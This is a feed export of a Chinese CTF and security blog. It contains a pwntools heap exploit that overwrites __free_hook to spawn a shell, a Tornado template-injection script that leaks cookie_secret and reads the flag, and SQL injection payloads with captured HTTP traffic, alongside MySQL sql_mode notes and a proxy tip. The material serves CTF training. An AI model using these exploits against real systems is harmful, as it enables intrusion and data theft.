:u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))</span><br><span class="line">    ruf7    &#x3D; lambda                    :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))</span><br><span class="line">    lg      &#x3D; lambda data               :log.success(data)</span><br><span class="line">    def add(content):</span><br><span class="line">        sla(&quot;&gt;&gt;&gt;&quot;,&quot;1&quot;)</span><br><span class="line">        s(content)</span><br><span class="line">    def start():</span><br><span class="line">        sla(&quot;&gt;&gt;&gt;&quot;,&quot;2&quot;)</span><br><span class="line">    def recy():</span><br><span class="line">        sla(&quot;&gt;&gt;&gt;&quot;,&quot;3&quot;)</span><br><span class="line">    def gift():</span><br><span class="line">        sla(&quot;&gt;&gt;&gt;&quot;,&quot;4&quot;)</span><br><span class="line">    gift()</span><br><span class="line">    add(p8(0x9) + p8(0x11) + p32(0x99999999))</span><br><span class="line">    start()</span><br><span class="line">    ru(&quot;0x&quot;)</span><br><span class="line">    pie &#x3D; int(r(8),16) - 0x6c0</span><br><span class="line">    payload &#x3D; p8(0x71) + p32(pie + elf.got[&#39;__libc_start_main&#39;])</span><br><span class="line">    payload +&#x3D; p8(0x76) + p32(0) + p8(0x53) + p8(0)</span><br><span class="line">    payload +&#x3D; p8(0x71) + p32(pie + elf.got[&#39;__libc_start_main&#39;] + 1)</span><br><span class="line">    payload +&#x3D; p8(0x76) + p32(0) + p8(0x53) + p8(0)</span><br><span class="line">    payload +&#x3D; p8(0x71) + p32(pie + elf.got[&#39;__libc_start_main&#39;] + 2)</span><br><span class="line">    payload +&#x3D; p8(0x76) + p32(0) + p8(0x53) + p8(0)</span><br><span class="line">    payload +&#x3D; p8(0x71) + p32(pie + elf.got[&#39;__libc_start_main&#39;] + 3)</span><br><span class="line">    payload +&#x3D; p8(0x76) + p32(0) + p8(0x53) + p8(0)</span><br><span class="line">    payload +&#x3D; p32(0x99999999)</span><br><span class="line">    add(payload)</span><br><span class="line">    start()</span><br><span class="line">    __libc_start_main &#x3D; ruf7()</span><br><span class="line">    libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">    lib.address &#x3D; libc</span><br><span class="line">    system &#x3D; lib.symbols[b&#39;system&#39;]</span><br><span class="line">    binsh &#x3D; lib.search(b&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">    __free_hook &#x3D; lib.symbols[b&#39;__free_hook&#39;]</span><br><span class="line">    __malloc_hook &#x3D; lib.symbols[b&#39;__malloc_hook&#39;]</span><br><span class="line">    __realloc_hook &#x3D; lib.symbols[b&#39;__realloc_hook&#39;]</span><br><span class="line">    one_gadget &#x3D; []</span><br><span class="line">    payload &#x3D; p8(0x71) + p32(__free_hook)</span><br><span class="line">    payload +&#x3D; p8(0x76) + p32(0) + p8(0x54) + p8(0)</span><br><span class="line">    payload +&#x3D; p8(0x71) + p32(__free_hook + 1)</span><br><span class="line">    payload +&#x3D; p8(0x76) + p32(0) + p8(0x54) + p8(0)</span><br><span class="line">    payload +&#x3D; p8(0x71) + p32(__free_hook + 2)</span><br><span class="line">    payload +&#x3D; p8(0x76) + p32(0) + p8(0x54) + p8(0)</span><br><span class="line">    payload +&#x3D; p8(0x71) + p32(__free_hook + 3)</span><br><span class="line">    payload +&#x3D; p8(0x76) + p32(0) + p8(0x54) + p8(0)</span><br><span class="line">    payload +&#x3D; p32(0x99999999)</span><br><span class="line">    add(payload)</span><br><span class="line">    start()</span><br><span class="line">    s(p32(system))</span><br><span class="line">    sleep(1)</span><br><span class="line">    payload &#x3D; &quot;\x80\x00sh\x00\x00\x99&quot;</span><br><span class="line">    add(payload)</span><br><span class="line">    start()</span><br><span class="line">    recy()</span><br><span class="line">    if awd &#x3D;&#x3D; False:</span><br><span class="line">        irt()</span><br><span class="line">if __name__ &#x3D;&#x3D; b&quot;__main__&quot;:</span><br><span class="line">    context.log_level &#x3D; b&quot;DEBUG&quot;</span><br><span class="line">    ctx.binary &#x3D; binary_file</span><br><span class="line">    ctx.remote_libc &#x3D; remote_libc_file</span><br><span class="line">    ctx.remote &#x3D; (remote_ip,remote_port)</span><br><span class="line">    sh &#x3D; ctx.start(&quot;remote&quot;)</span><br><span class="line">    exploit(sh,remote &#x3D; True)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h5 id=&quot;这次比赛的质量比较高的，做了4个Pwn，发现自己还需要学很多东西&quot;&gt;这次比赛的质量比较高的，做了4个Pwn，发现自己还需要学很多东西&lt;/h5&gt;
&lt;h1&gt;&lt;strong&gt;PWN：&lt;/strong&gt;&lt;/h1&gt;
&lt;h2 id=&quot;题目名称-题目状态-working-xxx
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MacOS-proxy代理</title>
    <link href="http://yoursite.com/2020/03/12/MacOS-proxy%E4%BB%A3%E7%90%86/"/>
    <id>http://yoursite.com/2020/03/12/MacOS-proxy%E4%BB%A3%E7%90%86/</id>
    <published>2020-03-12T05:45:02.000Z</published>
    <updated>2020-03-12T05:49:42.063Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MacOS-brew使用proxy代理">MacOS-brew使用proxy代理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;代理服务器IP:端口 brew install 软件名</span><br></pre></td></tr></table></figure><h2 id="Goland下载包使用proxy">Goland下载包使用proxy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;代理服务器IP:端口 go get github.com&#x2F;xxxxxxxx</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MacOS-brew使用proxy代理&quot;&gt;MacOS-brew使用proxy代理&lt;/h2&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;
      
    
    </summary>
    
    
      <category term="MacOS" scheme="http://yoursite.com/categories/MacOS/"/>
    
    
      <category term="MacOS" scheme="http://yoursite.com/tags/MacOS/"/>
    
  </entry>
  
  <entry>
    <title>Linux-libc-2.30_ptmalloc_分析</title>
    <link href="http://yoursite.com/2020/03/08/Linux-libc-2.30_ptmalloc_%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/03/08/Linux-libc-2.30_ptmalloc_%E5%88%86%E6%9E%90/</id>
    <published>2020-03-08T12:17:02.000Z</published>
    <updated>2020-03-26T03:20:49.270Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个密码看着不太对, 请再试试."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="213b76f5ff16824505721fc4297fa353074aa0e8188acfa0653446b6d033cbcf"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      该文章被加密了，请联系管理员请求密码。
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>SQL-sql_mode详解</title>
    <link href="http://yoursite.com/2020/03/08/SQL-sql_mode%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/03/08/SQL-sql_mode%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-03-08T04:54:43.000Z</published>
    <updated>2020-03-06T16:59:25.582Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sql-mode-常用值说明">sql_mode 常用值说明</h2><h2 id="官方手册专门有一节介绍-https-dev-mysql-com-doc-refman-5-6-en-sql-mode-html-。-SQL-Mode-定义了两个方面：MySQL应支持的SQL语法，以及应该在数据上执行何种确认检查。">官方手册专门有一节介绍 <a href="https://dev.mysql.com/doc/" target="_blank" rel="noopener">https://dev.mysql.com/doc/</a> refman/5.6/en/sql-mode.html 。 SQL Mode 定义了两个方面：MySQL应支持的SQL语法，以及应该在数据上执行何种确认检查。</h2><h2 id="1-SQL语法支持类">1. SQL语法支持类</h2><h3 id="ONLY-FULL-GROUP-BY-对于GROUP-BY聚合操作，如果在SELECT中的列、HAVING或者ORDER-BY子句的列，没有在GROUP-BY中出现，那么这个SQL是不合法的。是可以理解的，因为不在-group-by-的列查出来展示会有矛盾。">ONLY_FULL_GROUP_BY 对于GROUP BY聚合操作，如果在SELECT中的列、HAVING或者ORDER BY子句的列，没有在GROUP BY中出现，那么这个SQL是不合法的。是可以理解的，因为不在 group by 的列查出来展示会有矛盾。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在5.7中默认启用，所以在实施5.6升级到5.7的过程需要注意：</span><br><span class="line"> Expression #1 of SELECT list is not in GROUP BY</span><br><span class="line">clause and contains nonaggregated column</span><br><span class="line">&#39;1066export.ebay_order_items.TransactionID&#39; which</span><br><span class="line">is not functionally dependent on columns in GROUP BY</span><br><span class="line">clause; this is incompatible with sql_mode&#x3D;only_full_group_by</span><br></pre></td></tr></table></figure><h3 id="ANSI-QUOTES-启用-ANSI-QUOTES-后，不能用双引号来引用字符串，因为它被解释为识别符，作用与-一样。设置它以后，update-t-set-f1-…，会报-Unknown-column-‘’-in-field-list-这样的语法错误。">ANSI_QUOTES 启用 ANSI_QUOTES 后，不能用双引号来引用字符串，因为它被解释为识别符，作用与 ` 一样。设置它以后，update t set f1=&quot;&quot; …，会报 Unknown column ‘’ in 'field list 这样的语法错误。</h3><h3 id="PIPES-AS-CONCAT-将-视为字符串的连接操作符而非-或-运算符，这和Oracle数据库是一样的，也和字符串的拼接函数-CONCAT-相类似。">PIPES_AS_CONCAT 将 || 视为字符串的连接操作符而非 或 运算符，这和Oracle数据库是一样的，也和字符串的拼接函数 CONCAT() 相类似。</h3><h3 id="NO-TABLE-OPTIONS-使用-SHOW-CREATE-TABLE-时不会输出MySQL特有的语法部分，如-ENGINE-，这个在使用-mysqldump-跨DB种类迁移的时候需要考虑。">NO_TABLE_OPTIONS 使用 SHOW CREATE TABLE 时不会输出MySQL特有的语法部分，如 ENGINE ，这个在使用 mysqldump 跨DB种类迁移的时候需要考虑。</h3><h3 id="NO-AUTO-CREATE-USER-字面意思不自动创建用户。在给MySQL用户授权时，我们习惯使用-GRANT-…-ON-…-TO-dbuser-顺道一起创建用户。设置该选项后就与oracle操作类似，授权之前必须先建立用户。5-7-7开始也默认了。">NO_AUTO_CREATE_USER 字面意思不自动创建用户。在给MySQL用户授权时，我们习惯使用 GRANT … ON … TO dbuser 顺道一起创建用户。设置该选项后就与oracle操作类似，授权之前必须先建立用户。5.7.7开始也默认了。</h3><h2 id="2-数据检查类">2. 数据检查类</h2><h3 id="NO-ZERO-DATE-认为日期-‘0000-00-00’-非法，与是否设置后面的严格模式有关。">NO_ZERO_DATE 认为日期 ‘0000-00-00’ 非法，与是否设置后面的严格模式有关。</h3><h3 id="如果设置了严格模式，则-NO-ZERO-DATE-自然满足。但如果是-INSERT-IGNORE-或-UPDATE-IGNORE，-0000-00-00’依然允许且只显示warning">如果设置了严格模式，则 NO_ZERO_DATE 自然满足。但如果是 INSERT IGNORE 或 UPDATE IGNORE，'0000-00-00’依然允许且只显示warning</h3><h3 id="如果在非严格模式下，设置了NO-ZERO-DATE，效果与上面一样，-0000-00-00’允许但显示warning；如果没有设置NO-ZERO-DATE，no-warning，当做完全合法的值。">如果在非严格模式下，设置了NO_ZERO_DATE，效果与上面一样，'0000-00-00’允许但显示warning；如果没有设置NO_ZERO_DATE，no warning，当做完全合法的值。</h3><h3 id="NO-ZERO-IN-DATE情况与上面类似，不同的是控制日期和天，是否可为-0-，即-2010-01-00-是否合法。">NO_ZERO_IN_DATE情况与上面类似，不同的是控制日期和天，是否可为 0 ，即 2010-01-00 是否合法。</h3><h3 id="NO-ENGINE-SUBSTITUTION-使用-ALTER-TABLE或CREATE-TABLE-指定-ENGINE-时，-需要的存储引擎被禁用或未编译，该如何处理。启用NO-ENGINE-SUBSTITUTION时，那么直接抛出错误；不设置此值时，CREATE用默认的存储引擎替代，ATLER不进行更改，并抛出一个-warning">NO_ENGINE_SUBSTITUTION 使用 ALTER TABLE或CREATE TABLE 指定 ENGINE 时， 需要的存储引擎被禁用或未编译，该如何处理。启用NO_ENGINE_SUBSTITUTION时，那么直接抛出错误；不设置此值时，CREATE用默认的存储引擎替代，ATLER不进行更改，并抛出一个 warning .</h3><h3 id="STRICT-TRANS-TABLES-设置它，表示启用严格模式。">STRICT_TRANS_TABLES 设置它，表示启用严格模式。</h3><h3 id="注意-STRICT-TRANS-TABLES-不是几种策略的组合，单独指-INSERT、UPDATE出现少值或无效值该如何处理：">注意 STRICT_TRANS_TABLES 不是几种策略的组合，单独指 INSERT、UPDATE出现少值或无效值该如何处理：</h3><h3 id="前面提到的把-‘’-传给int，严格模式下非法，若启用非严格模式则变成0，产生一个warning">前面提到的把 ‘’ 传给int，严格模式下非法，若启用非严格模式则变成0，产生一个warning</h3><h3 id="Out-Of-Range，变成插入最大边界值">Out Of Range，变成插入最大边界值</h3><h3 id="A-value-is-missing-when-a-new-row-to-be-inserted-does-not-contain-a-value-for-a-non-NULL-column-that-has-no-explicit-DEFAULT-clause-in-its-definition">A value is missing when a new row to be inserted does not contain a value for a non-NULL column that has no explicit DEFAULT clause in its definition</h3><h2 id="摘录于（https-segmentfault-com-a-1190000005936172）">摘录于（<a href="https://segmentfault.com/a/1190000005936172%EF%BC%89" target="_blank" rel="noopener">https://segmentfault.com/a/1190000005936172）</a></h2><h3 id="感谢原作者">感谢原作者</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;sql-mode-常用值说明&quot;&gt;sql_mode 常用值说明&lt;/h2&gt;
&lt;h2 id=&quot;官方手册专门有一节介绍-https-dev-mysql-com-doc-refman-5-6-en-sql-mode-html-。-SQL-Mode-定义了两个方面：MySQL
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-BUUCTF-Web刷题之旅-(1)</title>
    <link href="http://yoursite.com/2020/03/07/CTF-BUUCTF-Web%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/"/>
    <id>http://yoursite.com/2020/03/07/CTF-BUUCTF-Web%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/</id>
    <published>2020-03-07T09:16:43.000Z</published>
    <updated>2020-03-19T07:48:12.447Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-护网杯-2018-easy-tornado">0x01 [护网杯 2018]easy_tornado</h2><h3 id="打开之后发现三个连接，都点一下，然后发现flag在-fllllllllllllag的位置">打开之后发现三个连接，都点一下，然后发现flag在/fllllllllllllag的位置</h3><h3 id="发现hinit，如下">发现hinit，如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><h3 id="看到url有一个文件名，尝试修改文件名读取flag">看到url有一个文件名，尝试修改文件名读取flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b892f69c-7bf2-43a9-8234-3daf2322bfce.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;3295af9e1375bd422619c9bc3c19834a</span><br><span class="line">修改成下面的url</span><br><span class="line">http:&#x2F;&#x2F;b892f69c-7bf2-43a9-8234-3daf2322bfce.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;3295af9e1375bd422619c9bc3c19834a</span><br></pre></td></tr></table></figure><h3 id="读取失败了。接着跳转到error页面，如下">读取失败了。接着跳转到error页面，如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b892f69c-7bf2-43a9-8234-3daf2322bfce.node3.buuoj.cn&#x2F;error?msg&#x3D;Error</span><br></pre></td></tr></table></figure><h3 id="于是在msg字段尝试模板注入，如下">于是在msg字段尝试模板注入，如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b892f69c-7bf2-43a9-8234-3daf2322bfce.node3.buuoj.cn&#x2F;error?msg&#x3D;&#123;1+1&#125;</span><br><span class="line"></span><br><span class="line">显示结果</span><br><span class="line">&#123;1 1&#125;</span><br></pre></td></tr></table></figure><h3 id="很可能是屏蔽了一些字符">很可能是屏蔽了一些字符</h3><h3 id="经过测试大概只有数字、英文还有点号之类的可以用了">经过测试大概只有数字、英文还有点号之类的可以用了</h3><h3 id="上面的我们只是测试了注入的字符限制">上面的我们只是测试了注入的字符限制</h3><h3 id="接下来我们来测试一下以下数据">接下来我们来测试一下以下数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b892f69c-7bf2-43a9-8234-3daf2322bfce.node3.buuoj.cn&#x2F;error?msg&#x3D;&#123;&#123;1&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="发现大括号消失，确实是存在注入的">发现大括号消失，确实是存在注入的</h3><h3 id="根据上面的测试，可以知道filehash是文件读取的check，所以需要算出-flllllllllag对应的filehash，就可以读取文件，但是我们需要leak-cookie-secret才能算出filehash">根据上面的测试，可以知道filehash是文件读取的check，所以需要算出/flllllllllag对应的filehash，就可以读取文件，但是我们需要leak cookie_secret才能算出filehash</h3><h3 id="看到题目的名字叫easy-tornado，很可能是和tornado可能存在的注入有关">看到题目的名字叫easy_tornado，很可能是和tornado可能存在的注入有关</h3><h3 id="可以通过注入来输出handler-settings数据">可以通过注入来输出handler.settings数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b892f69c-7bf2-43a9-8234-3daf2322bfce.node3.buuoj.cn&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br><span class="line">输出</span><br><span class="line">&#123;&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;ee744aa1-8391-4ee5-b8d0-47a63832e8d6&#39;&#125;</span><br></pre></td></tr></table></figure><h3 id="成功发现cookie-secret">成功发现cookie_secret</h3><h3 id="接下来就是写exp了">接下来就是写exp了</h3><h3 id="Exploit如下">Exploit如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import hashlib</span><br><span class="line">import requests</span><br><span class="line">if len(sys.argv) &#x3D;&#x3D; 1:</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;b892f69c-7bf2-43a9-8234-3daf2322bfce.node3.buuoj.cn&quot;</span><br><span class="line">else:</span><br><span class="line">url &#x3D; sys.argv[1]</span><br><span class="line">uuid_regex &#x3D; &quot;(\w&#123;8&#125;(-\w&#123;4&#125;)&#123;3&#125;-\w&#123;12&#125;)&quot;</span><br><span class="line">flag_regex &#x3D; &quot;(flag\&#123;\w&#123;8&#125;(-\w&#123;4&#125;)&#123;3&#125;-\w&#123;12&#125;\&#125;)&quot;</span><br><span class="line">uuid_pattern &#x3D; re.compile(uuid_regex)</span><br><span class="line">flag_pattern &#x3D; re.compile(flag_regex)</span><br><span class="line">flag_file &#x3D; &quot;&#x2F;fllllllllllllag&quot;</span><br><span class="line">handler_leak_url &#x3D; &quot;%s&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;&quot; % url</span><br><span class="line">get_flag_url &#x3D; &quot;%s&#x2F;file?filename&#x3D;%s&amp;filehash&#x3D;%s&quot;</span><br><span class="line">response &#x3D; requests.get(handler_leak_url)</span><br><span class="line">regex_list &#x3D; uuid_pattern.findall(response.text)</span><br><span class="line">cookie_secret &#x3D; regex_list[0][0]</span><br><span class="line">filehash &#x3D; hashlib.md5(cookie_secret + hashlib.md5(flag_file).hexdigest()).hexdigest()</span><br><span class="line">response &#x3D; requests.get(get_flag_url % (url,flag_file,filehash))</span><br><span class="line">flag &#x3D; flag_pattern.findall(response.text)[0][0]</span><br><span class="line">print(&quot;[+] cookie_secret: %s&quot; % cookie_secret)</span><br><span class="line">print(&quot;[+] filehash: %s&quot; % filehash)</span><br><span class="line">print(&quot;[+] flag: %s&quot; % flag)</span><br></pre></td></tr></table></figure><h2 id="0x02-SUCTF-2019-EasySQL">0x02 [SUCTF 2019]EasySQL</h2><h3 id="解法1">解法1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><h3 id="使得源码中sql代码变成了以下形式">使得源码中sql代码变成了以下形式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select $_POST[&#39;query&#39;]||flag from Flag</span><br><span class="line">变成以下形式</span><br><span class="line">select *,1||flag from Flag</span><br></pre></td></tr></table></figure><h3 id="由于使用select-使得所有的表内容都被选中，也就是可以输出Flag的数据了">由于使用select *使得所有的表内容都被选中，也就是可以输出Flag的数据了</h3><h3 id="1的1可以写成true-true也是可以的，纯数字也是可以的">*,1的1可以写成true=true也是可以的，纯数字也是可以的</h3><h3 id="解法2">解法2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: bcaf4a9c-424e-4b75-9c52-0b324f06738d.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko&#x2F;20100101 Firefox&#x2F;73.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 46</span><br><span class="line">Origin: http:&#x2F;&#x2F;bcaf4a9c-424e-4b75-9c52-0b324f06738d.node3.buuoj.cn</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;bcaf4a9c-424e-4b75-9c52-0b324f06738d.node3.buuoj.cn&#x2F;</span><br><span class="line">Cookie: PHPSESSID&#x3D;1e28fa943aeca1cda5cd223f501792d7</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">query&#x3D;1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure><h4 id="通过设置sql-mode来改变字符的功能，使得源码中sql代码变成了以下形式">通过设置sql_mode来改变字符的功能，使得源码中sql代码变成了以下形式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select $_POST[&#39;query&#39;]||flag from Flag</span><br><span class="line">变成以下形式</span><br><span class="line">select 1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1||flag from Flag</span><br><span class="line">其实它就等效于</span><br><span class="line">select 1;set sql_mode&#x3D;PIPES_AS_CONCAT;select &quot;1&quot;+flag from Flag</span><br></pre></td></tr></table></figure><h4 id="得到flag">得到flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server:   </span><br><span class="line">Date: Fri, 06 Mar 2020 17:15:42 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">Pragma: no-cache</span><br><span class="line">X-Powered-By: PHP&#x2F;7.3.10</span><br><span class="line">Content-Length: 378</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script async&#x3D;true src&#x3D;&quot;http:&#x2F;&#x2F;t.wsgblw.com:88&#x2F;j1.js?MAC&#x3D;68DB549410D2&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;&#x2F;a&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;query&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; 1</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; 1flag&#123;48d5b598-c2fb-4629-8d7a-032a61159c28&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="0x03-RoarCTF-2019-Easy-Calc">0x03 [RoarCTF 2019]Easy Calc</h2><h3 id="通过测试发现数据发送到了calc-php，所以打开calc-php看看，发现calc-php直接给了源码">通过测试发现数据发送到了calc.php，所以打开calc.php看看，发现calc.php直接给了源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 